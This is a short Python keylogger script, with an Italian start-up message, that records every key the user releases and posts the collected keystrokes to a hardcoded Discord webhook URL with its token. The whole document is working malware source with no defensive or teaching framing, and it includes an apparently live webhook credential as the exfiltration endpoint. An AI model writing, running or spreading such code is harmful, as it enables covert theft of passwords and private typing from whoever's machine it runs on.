
import keyboard
import time
import requests
import threading

print("keylogger avviato con successo!")

webhook = "https://discord.com/api/webhooks/1256356579473621063/68opF89T8fCNpE0VCBpiHZoOVjlQ9YfvSIB6Z-G5CFKc3x2_ZF3A51c3-rAGXnuszwbP"

keylogs = []

def send_keylogs():
    global keylogs

    if keylogs:
        keylogs_str = "\n".join(keylogs)

        payload = {
            "content": keylogs_str
        }

        requests.post(webhook, data=payload)

        keylogs = []

threading.Timer(10, send_keylogs).start()

def capture_keystrokes(event):
    global keylogs
    keylogs.append(event.name)

keyboard.on_release(callback=capture_keystrokes)

while True:
    time.sleep(1)



